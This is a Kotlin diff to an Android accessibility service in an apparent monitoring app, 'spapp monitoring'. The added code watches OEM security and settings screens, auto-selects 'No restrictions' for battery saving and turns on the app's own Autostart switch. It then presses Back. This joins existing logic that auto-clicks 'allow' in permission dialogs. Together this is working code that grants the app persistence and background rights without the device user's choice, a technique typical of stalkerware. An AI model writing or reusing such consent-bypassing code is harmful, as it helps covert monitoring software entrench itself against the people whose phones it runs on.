@@ -236,6 +236,14 @@ class BlockAccessibilityService : AccessibilityService() {
                 "அனுமதி"
             )
 
+            // Step 1: OEM Autostart & Battery Saver No Restrictions handling
+            for (root in candidateRoots) {
+                if (handleAutostartAndBackgroundSettings(root)) {
+                    scheduleSyncAfterPermissionClick()
+                    return true
+                }
+            }
+
             for (root in candidateRoots) {
                 if (findAndClickExactText(root, allowExactTexts)) {
                     scheduleSyncAfterPermissionClick()
@@ -252,6 +260,101 @@ class BlockAccessibilityService : AccessibilityService() {
             }
         } catch (e: Exception) {
             Log.e("BlockA11y", "Error in clickAnyPermissionDialog", e)
+        }
+        return false
+    }
+
+    private var lastAutostartToggleTime = 0L
+
+    private fun handleAutostartAndBackgroundSettings(root: AccessibilityNodeInfo?): Boolean {
+        if (root == null) return false
+        val now = System.currentTimeMillis()
+        if (now - lastAutostartToggleTime < 1500L) return false
+
+        try {
+            val pkg = (root.packageName ?: "").toString().lowercase()
+            val isOemSettings = pkg.contains("securitycenter") ||
+                    pkg.contains("permcenter") ||
+                    pkg.contains("safecenter") ||
+                    pkg.contains("permission") ||
+                    pkg.contains("settings")
+
+            if (!isOemSettings) return false
+
+            // 1. Check for "No restrictions" in MIUI Battery Saver:
+            val noRestrictionMatches = root.findAccessibilityNodeInfosByText("No restrictions")
+            if (!noRestrictionMatches.isNullOrEmpty()) {
+                for (node in noRestrictionMatches) {
+                    if (clickNodeOrParent(node)) {
+                        lastAutostartToggleTime = now
+                        Log.i("BlockA11y", "Auto-selected 'No restrictions' in Battery Saver")
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            performGlobalAction(GLOBAL_ACTION_BACK)
+                        }, 800L)
+                        return true
+                    }
+                }
+            }
+
+            // 2. Look for our app name row in Autostart list:
+            val appKeywords = listOf("spapp", "monitoring", "spapp monitoring")
+            for (keyword in appKeywords) {
+                val matches = root.findAccessibilityNodeInfosByText(keyword)
+                if (!matches.isNullOrEmpty()) {
+                    for (node in matches) {
+                        if (findAndClickSwitchNearNode(node)) {
+                            lastAutostartToggleTime = now
+                            Log.i("BlockA11y", "Auto-toggled Autostart switch for '$keyword'")
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                performGlobalAction(GLOBAL_ACTION_BACK)
+                            }, 1000L)
+                            return true
+                        }
+                    }
+                }
+            }
+
+            // 3. In App Info page, look for "Autostart" row:
+            val autostartMatches = root.findAccessibilityNodeInfosByText("Autostart")
+            if (!autostartMatches.isNullOrEmpty()) {
+                for (node in autostartMatches) {
+                    if (findAndClickSwitchNearNode(node)) {
+                        lastAutostartToggleTime = now
+                        Log.i("BlockA11y", "Auto-toggled Autostart switch from App Info page")
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            performGlobalAction(GLOBAL_ACTION_BACK)
+                        }, 1000L)
+                        return true
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.w("BlockA11y", "handleAutostartAndBackgroundSettings error", e)
+        }
+        return false
+    }
+
+    private fun findAndClickSwitchNearNode(node: AccessibilityNodeInfo): Boolean {
+        var current: AccessibilityNodeInfo? = node
+        for (level in 0..3) {
+            val parent = current?.parent ?: break
+            for (i in 0 until parent.childCount) {
+                val child = parent.getChild(i) ?: continue
+                val className = (child.className ?: "").toString().lowercase()
+                val isSwitch = className.contains("switch") ||
+                        className.contains("button") ||
+                        className.contains("checkbox") ||
+                        className.contains("toggle") ||
+                        child.isCheckable
+                if (isSwitch && !child.isChecked) {
+                    if (child.isClickable && child.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                        return true
+                    } else if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                        return true
+                    }
+                }
+            }
+            current = parent
         }
         return false
     }
